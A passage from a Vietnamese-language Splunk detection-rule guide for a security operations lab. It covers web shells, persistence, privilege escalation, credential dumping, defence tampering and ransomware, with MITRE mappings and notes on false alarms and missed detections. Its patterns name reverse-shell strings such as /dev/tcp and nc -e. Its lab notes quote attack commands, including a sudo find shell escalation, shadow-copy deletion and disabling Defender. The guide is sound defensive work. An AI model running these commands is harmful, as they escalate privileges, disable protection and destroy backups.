- `match(...)`: Bắt các chuỗi reverse shell kinh điển (`/dev/tcp/`, `bash -i`, `nc -e`, `powershell -enc`) hoặc các tham số thực thi command (`cmd=`, `exec=`, `shell=`, `x=`).
- `extracted_cmd`: Bóc tách trực tiếp lệnh để SOC triage nhanh.

#### Optimized Production SPL Query
```bash
index=web_logs method IN ("GET","POST") status=200
    file IN ("*.php","*.phtml","*.asp","*.aspx","*.jsp")
| eval decoded_query=urldecode(urldecode(uri_query))
| where match(decoded_query, "(?i)(/dev/tcp/|/dev/udp/|bash\s+-i|sh\s+-i|python[0-9]?\s+-c\s|perl\s+-e\s|(nc|ncat)\s+-e|powershell\s+-enc)")
   OR match(decoded_query, "(?i)(^|[?&])(cmd|c|exec|execute|shell|x)=\s*(chmod|chown|rm|cp|mv|wget|curl|nc|ncat|bash|sh|php|python[0-9]?|perl|powershell|cmd\.exe|echo|systeminfo|wmic|net\s+user|net\s+localgroup|reg\s+|sc\s+|vssadmin)")
| rex field=decoded_query "(?i)(?:cmd|c|exec|execute|shell|x)=(?<extracted_cmd>[^&]+)"
| fillnull value="unauthenticated" user
| table _time clientip user host extracted_cmd decoded_query uri_path useragent status
| sort -_time
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Công cụ Pentest/Vulnerability Scanner nội bộ (Burp Suite, Nessus, Acunetix) quét kiểm thử tự động nhưng không khai thác thành công.
 - Traffic từ Honeypot hoặc WAF simulation bị cấu hình lẫn vào index sản xuất.
- **False Negative (FN)**:
 - Payload được mã hóa dạng khác (Base64, Hex) hoặc truyền qua `POST body` (Apache mặc định chỉ log URI trong `access.log`).
 - Response status khác 200 (ví dụ 302 Redirect hoặc 500 Internal Server Error nhưng lệnh hệ điều hành vẫn được thực thi ngầm).
 - Tệp web shell sử dụng extension lạ không nằm trong danh sách whitelist lọc ban đầu.

---

### Rule 02: Linux Cron Persistence via Service Accounts

![Rule 2 Splunk SPL Query và Kết Quả](assets/rules/rule02_cron_spl.png)
*Hình 5.2: Kết quả Splunk SPL phát hiện tạo Cron Job duy trì truy cập ngầm.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1053.003` (Scheduled Task/Job: Cron)
    - **Data Source**: `index=linux_security sourcetype=auditd`
    - **Pyramid of Pain**: ==TTPs / Behavior==
    - **Risk Weight**: **50**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **105 sự kiện** trên `host=uf-ubuntu` ghi nhận user `www-data` (`uid=33`) thực thi `/usr/bin/crontab`.


#### Kỹ thuật phân tích và Bảng nhận diện UID Service Account

| Numeric UID | Hệ điều hành thường gặp | Tài khoản dịch vụ tương ứng |
| :---: | :--- | :--- |
| **33** | Debian / Ubuntu | `www-data` |
| **48** | RHEL / CentOS / Fedora | `apache` |
| **80** | Một số bản phân phối Unix/BSD | `www` / `http` |
| **99** | RHEL / CentOS cũ / System Account | `nobody` / `system` |

#### Optimized Production SPL Query
```bash
index=linux_security sourcetype=auditd success=yes
    (comm IN ("crontab","at")
     OR exe IN ("/usr/bin/crontab","/usr/bin/at")
     OR key=cron_file_write)
| rex field=_raw "\buid=(?<uid>\d+)"
| rex field=_raw "\bUID=\"(?<account>[^\"]+)\""
| rex field=_raw "\bpid=(?<pid>\d+)"
| where match(account, "(?i)^(www-data|apache|nginx|httpd)$")
    OR uid IN (33,48,80,99)
| stats values(account) as account,
        values(comm) as comm,
        values(key) as audit_keys,
        dc(pid) as unique_pids,
        count as event_count,
        earliest(_time) as first_seen,
        latest(_time) as last_seen
  by host
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host account comm unique_pids audit_keys event_count
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Ứng dụng CMS (như WordPress, Moodle) tự động cập nhật cronjob thông qua user `www-data` theo thiết kế kiến trúc.
 - Quản trị viên sử dụng dải UID 33-99 cho các script tự động hóa hệ thống hợp lệ.
- **False Negative (FN)**:
 - Kẻ tấn công ghi đè trực tiếp vào `/etc/cron.d/`, `/etc/cron.daily/`, hoặc sử dụng `systemd timer` thay vì gọi lệnh `crontab`/`at`.
 - Service account chạy dưới UID tùy biến nằm ngoài danh sách (custom UID).

---

### Rule 03: Sudo Privilege Escalation và GTFOBins Abuse

![Rule 3 Splunk SPL Query và Kết Quả](assets/rules/rule03_sudo_spl.png)
*Hình 5.3: Kết quả Splunk SPL phát hiện leo thang đặc quyền qua lệnh Sudo bất thường.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1548.003` (Abuse Elevation Control Mechanism: Sudo)
    - **Data Source**: `index=linux_security sourcetype=linux_secure` (`/var/log/auth.log`)
    - **Pyramid of Pain**: ==TTPs / Behavior==
    - **Risk Weight**: **60**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **246 sự kiện** trên `host=uf-ubuntu`, phát hiện `www-data` thực thi `sudo /usr/bin/find . -exec /bin/sh ; -quit` leo quyền `root`.


#### Optimized Production SPL Query
```bash
index=linux_security sourcetype=linux_secure "sudo:"
| rex field=_raw "sudo:\s+(?<src_user>\S+)\s+:\s+PWD=(?<pwd>[^\s;]+)\s+;\s+USER=(?<dest_user>[^\s;]+)\s+;\s+COMMAND=(?<command>.*)"
| where isnotnull(src_user) AND isnotnull(dest_user) AND isnotnull(command)
| where match(command, "(?i)(/bin/sh|/bin/bash|bash\s+-i|sh\s+-i|find\s+.*-exec|vim|vi|nano|less|more|awk|perl|python|ruby|php|lua|nmap|man|ftp|tar|zip|env|socat|cp|chmod|chown)") OR dest_user="root"
| stats values(dest_user) as target_users, values(pwd) as working_dirs, values(command) as executed_cmds, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host, src_user
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host src_user target_users working_dirs executed_cmds event_count
| sort -first_seen
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Quản trị viên chạy `sudo` hợp lệ với các binary như `find`, `vim`, `less` để phục vụ tác vụ vận hành thường nhật.
 - Lệnh match với tất cả thao tác `dest_user="root"`, bao gồm cả quản trị chuẩn.
- **False Negative (FN)**:
 - Kẻ tấn công sử dụng binary nguy hiểm mới chưa được cập nhật vào regex hoặc file lookup `gtfobins_lookup.csv`.
 - Log sudo từ máy chủ chuyển qua syslog từ xa có định dạng khác chuẩn khiến regex trích xuất trường bị lỗi.

---

### Rule 04: Sensitive Configuration File Access in Non-Interactive Sessions

![Rule 4 Splunk SPL Query và Kết Quả](assets/rules/rule04_config_spl.png)
*Hình 5.4: Kết quả Splunk SPL phát hiện đọc trộm tệp tin cấu hình nhạy cảm.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1552.001` (Credentials In Files)
    - **Data Source**: `index=linux_security sourcetype=auditd` (audit key `sensitive_config_read`)
    - **Pyramid of Pain**: ==Host Artifacts / Behavior==
    - **Risk Weight**: **35**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **24 sự kiện** trên `host=uf-ubuntu` phát hiện `/usr/bin/cat` đọc file cấu hình dưới `auid=4294967295` (non-interactive web shell session).


#### Kỹ thuật phân tích `auid` và `tty`
- `auid=4294967295` (`0xFFFFFFFF` - unset): Đại diện cho tiến trình khởi chạy bởi service/daemon không có phiên đăng nhập trực tiếp (thường là process sinh ra từ exploit hoặc web shell).
- `tty=(none)`: Tiến trình không gắn liền với cửa sổ terminal tương tác của người dùng.

#### Optimized Production SPL Query
```bash
index=linux_security sourcetype=auditd key=sensitive_config_read success=yes type=SYSCALL
| where NOT match(exe, "(?i)(apache2|php-fpm|httpd|nginx)")
| where syscall!=89 AND syscall!=2
| eval session_type=if(auid=4294967295 OR tty="(none)", "non_interactive", "interactive")
| stats values(uid) as uids, values(auid) as auids, values(tty) as ttys, values(comm) as tools, values(exe) as exes, values(session_type) as session_types, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host uids auids ttys tools exes session_types event_count
| sort -first_seen
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Script backup hoặc agent monitoring tự động đọc cấu hình theo lịch (cron chạy dưới quyền root).
 - Các container hoặc worker process được khởi tạo bởi `systemd` đều mang `auid` unset.
- **False Negative (FN)**:
 - Kẻ tấn công đọc trộm file bằng cách lạm dụng chính tiến trình đã được whitelist (`php-fpm`, `apache2`).
 - File cấu hình bị đọc không nằm trong danh mục audit rule đã cấu hình trước (`key=sensitive_config_read`).

---

### Rule 05: Suspicious Ingress Tool Execution và Tunneling

![Rule 5 Splunk SPL Query và Kết Quả](assets/rules/rule05_tunnel_spl.png)
*Hình 5.5: Kết quả Splunk SPL phát hiện khởi chạy công cụ tạo đường hầm Chisel.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1105` (Ingress Tool Transfer), `T1090.001` (Internal Proxy)
    - **Data Source**: `index=linux_security sourcetype=auditd`
    - **Pyramid of Pain**: ==Tools / TTPs==
    - **Risk Weight**: **55**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **652 sự kiện** trên `host=uf-ubuntu` phát hiện binary `/tmp/chisel`, `/usr/bin/socat1`, `/usr/bin/wget`, `/usr/bin/curl`.


#### Optimized Production SPL Query
```bash
index=linux_security sourcetype=auditd (key=exec_cmds OR key=net_connect OR comm IN ("wget","curl","chisel","socat","proxychains","ncat","nc"))
| eval suspicious_path=if(match(exe, "^/(tmp|var/tmp|dev/shm)/"), 1, 0)
| eval known_tool=if(match(comm, "(?i)^(chisel|socat|proxychains|ncat|nc|curl|wget)$"), 1, 0)
| where suspicious_path=1 OR known_tool=1
| stats values(uid) as uids, values(key) as audit_keys, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host, comm, exe
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host uids comm exe audit_keys event_count
| sort -first_seen
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Quản trị viên sử dụng `curl`/`wget`/`nc` cho các tác vụ kiểm tra mạng thông thường.
 - Các phần mềm cài đặt tự động (CI/CD runner, Docker build) xả nén file thực thi vào `/tmp` để chạy tạm thời.
- **False Negative (FN)**:
 - Kẻ tấn công đổi tên binary (ví dụ đổi `chisel` thành `update_svc`).
 - Thực thi từ các thư mục có quyền ghi khác ngoài 3 thư mục trên (ví dụ `/home/user/.cache/`, `/dev/mqueue/`).

---

### Rule 06: Internal Reconnaissance và Multi-Port Scanning

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1046` (Network Service Discovery)
    - **Data Source**: `index=windows_sysmon EventCode=3` (Network Connection)
    - **Pyramid of Pain**: ==Network Artifacts==
    - **Risk Weight**: **20**


#### Optimized Production SPL Query
```bash
index=windows_sysmon EventCode=3 SourceIp="192.168.100.20"
| bin _time span=1m
| stats dc(DestinationPort) as unique_ports, values(DestinationPort) as targeted_ports, count as connection_count
  by SourceIp, DestinationIp, _time
| where unique_ports >= 3 OR connection_count > 15
| convert ctime(_time)
| table _time SourceIp DestinationIp unique_ports targeted_ports connection_count
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Máy quét lỗ hổng bảo mật nội bộ hợp pháp (Nessus, Qualys) quét định kỳ.
- **False Negative (FN)**:
 - Quét phân tán thời gian cực chậm (*Slow Scan / Stealth Scan* vượt ngoài khung thời gian 1 phút của `bin _time`).

---

### Rule 07: Suspicious Windows Remote Access / WinRM Authentication

![Rule 6 Splunk SPL Query](assets/rules/rule06_winrm_spl.png)
*Hình 5.6a: Cú pháp Splunk SPL phát hiện đăng nhập WinRM từ xa.*
![Rule 6 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule06_results.png)
*Hình 5.6b: Kết quả phân tích xác thực WinRM LogonType 3 trên Splunk.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1021.006` (Remote Services: WinRM)
    - **Data Source**: `index=windows_security EventCode=4624 Logon_Type=3`
    - **Pyramid of Pain**: ==TTPs / Asset Context==
    - **Risk Weight**: **75**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **2,808 sự kiện** Logon Type 3 trên `host=WIN-I370HR7VSPS`, nhận diện tài khoản `svc_backup` đăng nhập từ địa chỉ IP bàn đạp DMZ.


#### Phân tích Ý nghĩa Logon Types trên Windows
- `Logon Type 2`: Interactive (Đăng nhập bàn phím trực tiếp tại máy).
- `Logon Type 3`: Network (Truy cập qua mạng: WinRM, SMB file share, RPC, PsExec).
- `Logon Type 10`: RemoteInteractive (Đăng nhập giao diện từ xa qua RDP).

#### Optimized Production SPL Query
```bash
index=windows_security EventCode=4624 Logon_Type=3 Logon_Process IN ("NtLmSsp", "Kerberos")
| rex field=_raw "New Logon:[\s\S]*?Account Name:\s*(?<user_raw>[^\r\n]+)"
| eval user=replace(user_raw, ".*\\\\", "")
| where user!="-" AND NOT match(user, "\$$")
| bin _time span=15m
| stats values(Logon_Process) as auth_packages, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host, user, _time
| convert ctime(first_seen) ctime(last_seen)
| table _time host user auth_packages event_count
| sort -_time
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Mọi hoạt động truy cập File Share (SMB) hoặc xác thực dịch vụ nội bộ đều sinh Event 4624 Type 3 $\rightarrow$ Gây nhiễu rất cao nếu không lọc IP nguồn.
- **False Negative (FN)**:
 - Nếu không kiểm tra port (`5985/5986`) hoặc tiến trình đích `wsmprovhost.exe`, rule sẽ không phân biệt được WinRM với các traffic SMB/RPC khác.

---

### Rule 08: Local Admin Account Creation và Privilege Escalation

![Rule 7 Splunk SPL Query và Kết Quả](assets/rules/rule07_admin_spl.png)
*Hình 5.7: Kết quả Splunk SPL phát hiện tạo tài khoản ngầm và gán quyền Administrators.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1136.001` (Create Account: Local Account), `T1098` (Account Manipulation)
    - **Data Source**: `index=windows_security (EventCode=4720 OR EventCode=4732)`
    - **Pyramid of Pain**: ==TTPs / Behavior Pattern==
    - **Risk Weight**: **80**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **18 sự kiện** trên `host=WIN-I370HR7VSPS`, phát hiện `svc_backup` tạo user `backdoor` và thêm vào nhóm `Administrators`.


#### Optimized Production SPL Query
```bash
index=windows_security (EventCode=4720 OR EventCode=4732)
| rex field=_raw "Subject:[\s\S]*?Security ID:\s*(?<creator_raw>[^\r\n]+)"
| rex field=_raw "(?:New Account|Member):[\s\S]*?Security ID:\s*(?<target_raw>[^\r\n]+)"
| rex field=_raw "Group Name:\s*(?<group_name>[^\r\n]+)"
| eval creator=replace(creator_raw, ".*\\\\", "")
| eval target=replace(target_raw, ".*\\\\", "")
| eval action=case(EventCode=4720, "User_Created", EventCode=4732, "Group_Member_Added")
| bin _time span=15m
| stats values(creator) as creators, values(target) as targets, values(group_name) as groups, values(action) as actions, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host, _time
| convert ctime(first_seen) ctime(last_seen)
| table _time host creators targets groups actions event_count
| sort -_time
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Quản trị viên IT thực hiện onboarding nhân sự mới hoặc thêm user vào nhóm không nhạy cảm (như `Remote Desktop Users`).
- **False Negative (FN)**:
 - Kẻ tấn công sử dụng tài khoản Domain Admin tạo tài khoản trên Domain Controller (**Event 4728** - Global Group) thay vì local group.

---

### Rule 09: Windows Defender Tampering và Security Evasion

![Rule 8 Splunk SPL Query và Kết Quả](assets/rules/rule08_defender_spl.png)
*Hình 5.8: Kết quả Splunk SPL phát hiện hành vi tắt tính năng bảo vệ của Windows Defender.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1562.001` (Impair Defenses: Disable or Modify Tools)
    - **Data Source**: `windows_logs` (Defender 5001 / PowerShell 4104) và `windows_sysmon` (EventCode 1)
    - **Pyramid of Pain**: ==TTPs / High Confidence==
    - **Risk Weight**: **85**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **65 sự kiện** trên `host=WIN-I370HR7VSPS` ghi nhận `Set-MpPreference -DisableRealtimeMonitoring $true` (ScriptBlock 4104) và Defender Disabled (5001).


#### Optimized Production SPL Query
```bash
(index=windows_logs EventCode=5001 source="WinEventLog:Microsoft-Windows-Windows Defender/Operational")
OR (index=windows_logs source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104 (Message="*DisableRealtimeMonitoring*" OR Message="*Set-MpPreference*Disable*" OR Message="*Disable*Defender*"))
OR (index=windows_sysmon EventCode=1 (Image="*powershell.exe" OR Image="*cmd.exe") (CommandLine="*Set-MpPreference*" OR CommandLine="*DisableRealtimeMonitoring*"))
| eval detection_source=case(EventCode=5001, "Defender_Operational_5001", EventCode=4104, "PowerShell_ScriptBlock_4104", EventCode=1, "Sysmon_ProcessCreate_1", 1=1, "Other")
| rex field=_raw "(?i)(?:CommandLine|Message):\s*(?<cmd_raw>[^\r\n]+)"
| rex field=_raw "(?i)ParentImage:\s*(?<parent_raw>[^\r\n]+)"
| rex field=_raw "(?i)(?:User|Subject):\s*(?:Security ID:\s*)?(?<user_raw>[^\r\n]+)"
| eval user=replace(user_raw, ".*\\\\", "")
| eval parent=mvindex(split(parent_raw, "\\"), -1)
| eval cmd=if(detection_source="Defender_Operational_5001", "Realtime Protection Disabled", substr(cmd_raw, 1, 80))
| bin _time span=15m
| stats values(user) as users, values(EventCode) as event_codes, values(cmd) as cmds, values(parent) as parent_images, count as event_count
  by host, detection_source, _time
| convert ctime(_time)
| table _time host detection_source users event_codes cmds parent_images event_count
| sort -_time
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Quản trị viên tắt tạm thời Defender để cài đặt phần mềm đặc thù.
 - Phần mềm EDR/Antivirus bên thứ 3 khi cài đặt tự động tắt Defender để tránh xung đột tài nguyên.
- **False Negative (FN)**:
 - Kẻ tấn công sửa trực tiếp Registry (`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`) mà không qua lệnh PowerShell hoặc CLI.
 - Script PowerShell bị mã hóa Obfuscation (Base64, chuỗi phân mảnh) làm ẩn từ khóa `Set-MpPreference`.

---

### Rule 10: LSASS Memory Dumping và Credential Extraction

![Rule 9 Splunk SPL Query và Kết Quả](assets/rules/rule09_lsass_spl.png)
*Hình 5.9: Kết quả Splunk SPL phát hiện truy cập trái phép vào bộ nhớ tiến trình LSASS.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1003.001` (OS Credential Dumping: LSASS Memory)
    - **Data Source**: `index=windows_sysmon EventCode=10` (ProcessAccess)
    - **Pyramid of Pain**: ==TTPs / LOLBins==
    - **Risk Weight**: **90**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **10 sự kiện** trên `host=WIN-I370HR7VSPS` phát hiện `C:\Windows\Temp\procdump64.exe` mở handle `0x1FFFFF` tới `lsass.exe` với `CallTrace` chứa `dbgcore.dll`.


#### Kỹ thuật phân tích và Logic nâng cao
- **Cơ chế Handle Access**: Khi một tiến trình gọi `OpenProcess()` tới `lsass.exe`, Sysmon ghi nhận cờ `GrantedAccess`. Các mask nguy hiểm như `0x1FFFFF` (PROCESS_ALL_ACCESS), `0x1010` (PROCESS_VM_READ), `0x1410`, `0x1438` cho phép đọc bộ nhớ để trích xuất hash NTLM và Kerberos tickets.
- **Kỹ thuật Attacker "Giả Lập" User `SYSTEM` qua Service**: Attacker ban đầu xâm nhập dưới user `svc_backup` qua WinRM. Để dump LSASS với quyền cao nhất, attacker dùng `sc.exe create DumpService` để kích hoạt tiến trình chạy dưới danh nghĩa **`NT AUTHORITY\SYSTEM`**. Do đó, **tuyệt đối không được loại trừ `user="SYSTEM"`** vì sẽ gây False Negative nghiêm trọng. Thay vào đó, phải đánh giá **thư mục thực thi bất thường (`is_suspicious_path`)** kết hợp chữ ký **`CallTrace`**.
- **Chữ ký CallTrace và MiniDump API**: Phân tích stack trace để nhận diện lời gọi hàm từ `dbgcore.dll` / `dbghelp.dll` (`MiniDumpWriteDump`), `comsvcs.dll` (LOLBin), hoặc địa chỉ bộ nhớ `UNKNOWN` (dấu hiệu của Direct Syscalls / EDR Unhooking).

#### Optimized Production SPL Query (Next-Gen LSASS Detection)
```bash
index=windows_sysmon EventCode=10 TargetImage="*lsass.exe"
| eval user=replace(SourceUser, ".*\\\\", "")
| eval is_suspicious_path=if(match(SourceImage, "(?i)^C:\\\\(Windows\\\\Temp|Users|ProgramData|AppData|Temp)\\\\"), "YES", "NO")
| eval dump_api=case(
    match(CallTrace, "(?i)(dbgcore\.dll|dbghelp\.dll)"), "MiniDumpWriteDump (API Call)",
    match(CallTrace, "(?i)comsvcs\.dll"), "comsvcs.dll (LOLBin)",
    match(CallTrace, "(?i)UNKNOWN"), "Direct Syscall / Memory Injection",
    1=1, "Standard Handle Access"
  )
| where GrantedAccess IN ("0x1010","0x1410","0x1438","0x143a","0x1f0fff","0x1f1fff","0x1fffff","0x1FFFFF")
| where NOT match(SourceImage, "(?i)(MsMpEng|Sense|lsass)\.exe$")
| stats count as access_count,
        values(user) as users,
        values(GrantedAccess) as granted_accesses,
        values(is_suspicious_path) as from_suspicious_path,
        values(dump_api) as detected_dump_apis,
        earliest(_time) as first_seen,
        latest(_time) as last_seen
  by host, SourceImage
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host SourceImage users from_suspicious_path granted_accesses detected_dump_apis access_count
```

#### Truy Vấn Tương Quan Toàn Diện Vòng Đời Dump LSASS (End-to-End Correlation)
```bash
index=windows_sysmon (
    (EventCode=1 (Image="*procdump*" OR CommandLine="*lsass*"))
    OR (EventCode=10 TargetImage="*lsass.exe")
    OR (EventCode=11 TargetFilename="*lsass*.dmp")
)
| eval activity_stage=case(
    EventCode=1, "1. Process/Service Execution (" . Image . ")",
    EventCode=10, "2. LSASS Memory Handle Opened (" . GrantedAccess . ")",
    EventCode=11, "3. Memory Dump File Written (" . TargetFilename . ")"
  )
| eval executed_detail=coalesce(CommandLine, TargetFilename, GrantedAccess)
| eval actor=coalesce(User, SourceUser)
| table _time host activity_stage actor executed_detail
| sort _time
```

---

### Rule 11: Volume Shadow Copies (VSS) Deletion

![Rule 10 Splunk SPL Query và Kết Quả](assets/rules/rule10_vss_spl.png)
*Hình 5.10: Kết quả Splunk SPL phát hiện lệnh xóa bản sao lưu Volume Shadow Copies.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1490` (Inhibit System Recovery)
    - **Data Source**: `index=windows_sysmon EventCode=1` / `windows_security EventCode=4688`
    - **Pyramid of Pain**: ==TTPs / Critical Pre-Ransomware Indicator==
    - **Risk Weight**: **95**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác **8 sự kiện** trên `host=WIN-I370HR7VSPS` ghi nhận `vssadmin.exe delete shadows /all /quiet` gọi bởi `wsmprovhost.exe`.


#### Optimized Production SPL Query
```bash
index=windows_sysmon EventCode=1 (Image="*vssadmin.exe" OR Image="*wmic.exe" OR Image="*wbadmin.exe" OR Image="*bcdedit.exe")
| where match(CommandLine, "(?i)(vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete|wbadmin.*delete|bcdedit.*(recoveryenabled.*no|bootstatuspolicy.*ignoreallfailures))")
| eval user_raw=if(User="NOT_TRANSLATED" OR isnull(User), ParentUser, User)
| eval user=replace(user_raw, ".*\\\\", "")
| eval parent=mvindex(split(ParentImage, "\\"), -1)
| stats values(user) as users, values(parent) as parents, values(CommandLine) as commands, count as event_count,
        earliest(_time) as first_seen, latest(_time) as last_seen
  by host, Image
| convert ctime(first_seen) ctime(last_seen)
| table first_seen last_seen host users Image parents commands event_count
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Phần mềm sao lưu doanh nghiệp (*Veeam, Commvault, Acronis*) xóa các snapshot cũ theo chính sách xoay vòng lưu trữ.
- **False Negative (FN)**:
 - Xóa Shadow Copies thông qua lệnh PowerShell WMI (`Get-CimInstance Win32_ShadowCopy | Remove-CimInstance`) hoặc qua trực tiếp COM API.

---

### Rule 12: Ransomware Mass File Encryption Activity

![Rule 11 Splunk SPL Query](assets/rules/rule11_encryption_spl.png)
*Hình 5.11a: Cú pháp Splunk SPL phát hiện hành vi mã hóa hàng loạt tệp tin.*
![Rule 11 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule11_results.png)
*Hình 5.11b: Kết quả phát hiện tạo hàng loạt tệp có phần mở rộng .locked.*

??? note "Metadata Box"

    - **MITRE ATT&CK**: `T1486` (Data Encrypted for Impact)
    - **Data Source**: `index=windows_sysmon EventCode=11` (FileCreate / Rename)
    - **Pyramid of Pain**: ==TTPs / High Velocity Impact==
    - **Risk Weight**: **100**
    - **Kiểm chứng Splunk Lab**: Bắt chính xác các đợt mã hóa **30 - 60 file** đồng loạt trong khung thời gian 5 phút trên `host=WIN-I370HR7VSPS` với phần mở rộng `.locked`.


#### Optimized Production SPL Query
```bash
index=windows_sysmon EventCode=11
| where match(TargetFilename, "(?i)\.(locked|encrypted|crypt|crypto|enc|locked_[^\.]+)$")
| eval user_raw=if(User="NOT_TRANSLATED" OR isnull(User), "unknown", User)
| eval user=replace(user_raw, ".*\\\\", "")
| bin _time span=5m
| stats dc(TargetFilename) as files_encrypted,
        values(TargetFilename) as sample_files,
        count as total_events,
        earliest(_time) as first_seen,
        latest(_time) as last_seen
  by host, Image, user, _time
| where files_encrypted >= 3
| convert ctime(first_seen) ctime(last_seen)
| table _time host user Image files_encrypted sample_files total_events first_seen last_seen
| sort -_time
```

#### Phân tích Giới hạn Phát hiện (False Positives và False Negatives)
- **False Positive (FP)**:
 - Các phần mềm nén file hoặc mã hóa dữ liệu hợp lệ được người dùng sử dụng (*7-Zip AES, VeraCrypt, GPG*).
- **False Negative (FN)**:
 - Ransomware mã hóa trực tiếp nội dung file mà **không đổi tên hoặc phần mở rộng**.
 - Kịch bản mã hóa chậm (*Low-and-Slow Ransomware*) phân tán thời gian ghi file vượt ngoài khung 5 phút để tránh vượt ngưỡng threshold.
 - Các biến thể mã hóa hiện đại sử dụng phần mở rộng ngẫu nhiên (*Random Extension* theo Victim ID).

---

## 6. Chuyên Sâu Kỹ Thuật Bitmask Quyền Truy Cập LSASS (`GrantedAccess` Deep Dive)

!!! warning "Cơ chế hoạt động của `GrantedAccess` Mask"

    Khi một tiến trình gọi hàm Windows API `OpenProcess()` tới `lsass.exe`, trường `GrantedAccess` trong **Sysmon EventCode 10** lưu lại quyền hạn chính xác được cấp phát. Kẻ tấn công bắt buộc phải có các quyền đọc bộ nhớ ảo (`PROCESS_VM_READ`) để dump password hashes và Kerberos tickets.


```mermaid
graph TD
    OP["Tiến trình nguồn gọi OpenProcess(lsass.exe)"] --> MASK{"GrantedAccess Bitmask"}
    
    MASK -->|"0x1000"| BENIGN["PROCESS_QUERY_LIMITED_INFORMATION \n (Thông tin cơ bản, An toàn)"]
    MASK -->|"0x1010 / 0x1410"| READ["PROCESS_VM_READ + QUERY_INFORMATION \n ⚠️ Đọc bộ nhớ (Dump Hashes)"]
    MASK -->|"0x1438 / 0x143A"| INJECT["PROCESS_VM_READ + WRITE + CREATE_THREAD \n  Mimikatz / Thread Injection"]
    MASK -->|"0x1FFFFF"| FULL["PROCESS_ALL_ACCESS \n  Procdump / Debugger Full Access"]

```

### Bảng Ma Trận Chi Tiết Hex Masks và Chữ Ký Công Cụ

| Mã Hex Mask | Quyền chi tiết cấu thành (Win32 API Access Rights) | Công cụ / Hành vi thực tế | Đánh giá mức độ rủi ro |
| :---: | :--- | :--- | :---: |
| **`0x1000`** | `PROCESS_QUERY_LIMITED_INFORMATION` | Truy vấn trạng thái cơ bản của tiến trình | **Thấp** (Bình thường) |
| **`0x1010`** | `PROCESS_QUERY_LIMITED_INFORMATION` + `PROCESS_VM_READ` | Biến thể Mimikatz, MiniDumpWriteDump tối giản | **Cao** (Nguy hiểm) |
| **`0x1410`** | `PROCESS_QUERY_LIMITED_INFORMATION` + `PROCESS_VM_READ` + `PROCESS_QUERY_INFORMATION` | Công cụ Generic Memory Dumper | **Cao** (Mấu chốt Dump) |
| **`0x1438`** | `PROCESS_VM_READ` + `PROCESS_VM_WRITE` + `PROCESS_CREATE_THREAD` + `SYNCHRONIZE` | Dumpert, Custom In-memory Loaders | **Rất cao** (Khai thác) |
| **`0x143a`** | `PROCESS_VM_READ` + `PROCESS_VM_WRITE` + `PROCESS_CREATE_THREAD` + `PROCESS_DUP_HANDLE` | Mimikatz newer versions | **Rất cao** (Khai thác) |
| **`0x1f0fff`** | `PROCESS_ALL_ACCESS` ngoại trừ các quyền can thiệp thread | *Mimikatz lsadump* | **Khẩn cấp** (Critical) |
| **`0x1f1fff`** | `PROCESS_ALL_ACCESS` bao gồm thread operations | *Mimikatz sekurlsa* | **Khẩn cấp** (Critical) |
| **`0x1fffff`** | `PROCESS_ALL_ACCESS` (Toàn quyền trên tiến trình đích) | **`procdump.exe`**, LiveKD, WinDbg | **Khẩn cấp** (Critical) |

---

## 7. Ma Trận Tương Quan và Kim Tự Tháp Nỗi Đau (Pyramid of Pain)

```mermaid
graph BT
    TTP["TTPs (Hành vi và Chiến thuật) \n [Rules: 02, 03, 05, 07, 08, 09, 10, 11, 12] \n Độ khó của Kẻ tấn công: TỐI ĐA (Tough!)"]
    TOOLS["Công cụ (Tools: Chisel, Socat, Procdump, Evil-WinRM) \n [Rules: 01, 05, 09] \n Độ khó: Khó (Challenging)"]
